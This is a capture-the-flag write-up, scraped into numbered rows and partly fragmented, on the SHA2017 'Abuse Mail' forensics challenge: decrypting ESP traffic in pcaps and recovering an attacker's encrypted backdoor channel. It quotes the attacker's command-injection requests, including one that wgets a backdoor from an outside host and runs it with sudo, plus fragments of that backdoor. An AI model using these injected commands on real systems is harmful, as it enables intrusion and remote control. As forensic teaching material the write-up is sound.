7127-bin,1,<link rel='stylesheet' id='highlander-comments-ie7-css'  href='https://s2.wp.com/wp-content/mu-plugins/highlander-comments/style-ie7.css?m=1351637563h&#038;ver=20110606' media='all' />
7127-bin,2,Skip to content
7127-bin,3,Because life is not only playing wow and live at your parents house on your 30's
7127-bin,4,ASIS finals 2016
7127-bin,5,[Crypto]  SRPP (Secure Remote Password Protocol)
7127-bin,6,Abuse Mail (300) – 62 solves
7127-bin,7,Our abuse desk received an mail that someone from our network has hacked their company
7127-bin,8,"With their help we found some suspected traffic in our network logs, but we can't find what exactly has happened"
7127-bin,9,Can you help us to catch the culprit?
7127-bin,10,"we have 3 capture files abuse00.pcap, abuse01.pcap and abuse02.pcap"
7127-bin,11,Starting with abuse00.pcap we can see we have some encrypted ESP packages and some telenet communication
7127-bin,12,Let's check telenet's packages:
7127-bin,13,Now we have the credentials to decrypt the ESP packages! using wireshark to decrypt them Edit -> Preferences -> Protocols -> ESP
7127-bin,14,After decrypting it we can see that the hacker used a remote command vulnerability at the GET parameter IP to  upload a backdoor on the server
7127-bin,15,the commands he used:
7127-bin,16,GET /?ip=google.com HTTP/1.1
7127-bin,17,GET /?ip=google.com;ls HTTP/1.1
7127-bin,18,"4 packets transmitted, 4 received, 0% packet loss, time 3005ms"
7127-bin,19,GET /?ip=;ls%20-la HTTP/1.1
7127-bin,20,GET /?ip=;sudo%20-l HTTP/1.1
7127-bin,21,Matching Defaults entries for www-data on router:
7127-bin,22,User www-data may run the following commands on router:
7127-bin,23,GET /?ip=;id HTTP/1.1
7127-bin,24,GET /?ip=;wget http://10.5.5.207/backdoor.py -O /tmp/backdoor.py HTTP/1.1
7127-bin,25,Connecting to 10.5.5.207:80..
7127-bin,26,connected.
7127-bin,27,"HTTP request sent, awaiting response.."
7127-bin,28,Saving to: '/tmp/backdoor.py'
7127-bin,29,2017-07-26 09:43:36 (458 MB/s) - '/tmp/backdoor.py' saved [2428/2428]
7127-bin,30,GET /?ip=;cat /tmp/backdoor.py HTTP/1.1
7127-bin,31,"ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)"
7127-bin,32,yield L[i:i+n]
7127-bin,33,try:
7127-bin,34,"#print ""[+] Sending file {}"".format(data[1])"
7127-bin,35,pass
7127-bin,36,GET /?ip=;nohup sudo python /tmp/backdoor.py K8djhaIU8H2d1jNb & HTTP/1.1
7127-bin,37,The hacker used AES to encrypt his commands! And we know the password he used! which we can get it from the GET HTTP request! which was K8djhaIU8H2d1jNb 'GET /?ip=;nohup sudo python /tmp/backdoor.py K8djhaIU8H2d1jNb & HTTP/1.1'.
7127-bin,38,"ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)"
7127-bin,39,yield L[i:i+n]
7127-bin,40,try:
7127-bin,41,"#print ""[+] Sending file {}"".format(data[1])"
7127-bin,42,pass
7127-bin,43,"With all this information we need to decrypt the packages from the other PCAPs, which contains the communication between the hacker and the server, we can use the hackers script and password! first lets extract the encrypted data with tshark!"
7127-bin,44,kinyabitch@Debian ~/D/H/c/sha2017> tshark -r abuse02.pcap -Tfields -e data | xxd -r -p > encrypted1
7127-bin,45,kinyabitch@Debian ~/D/H/c/sha2017> tshark -r abuse03.pcap -Tfields -e data | xxd -r -p > encrypted2
7127-bin,46,Now modifing the scrypt so we can decrypt our IMCP encrypted data:
7127-bin,47,"ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)"
7127-bin,48,yield L[i:i+n]
7127-bin,49,#     try:
7127-bin,50,"#                         #print ""[+] Sending file {}"".format(data[1])"
7127-bin,51,# if outp not in lis:
7127-bin,52,print outp
7127-bin,53,Running the script:
7127-bin,54,kinyabitch@Debian ~/D/H/c/sha2017> python back.py
7127-bin,55,drwx------  2 root root 4096 Jul 27 07:27 .ssh
7127-bin,56,# The following lines are desirable for IPv6 capable hosts
7127-bin,57,Starting Nmap 7.01 ( https://nmap.org ) at 2017-07-27 09:48 PDT
7127-bin,58,Host is up (0.00010s latency).
7127-bin,59,Not shown: 997 closed ports
7127-bin,60,MAC Address: 00:0C:29:3D:FD:B0 (VMware)
7127-bin,61,Nmap done: 1 IP address (1 host up) scanned in 1.52 seconds
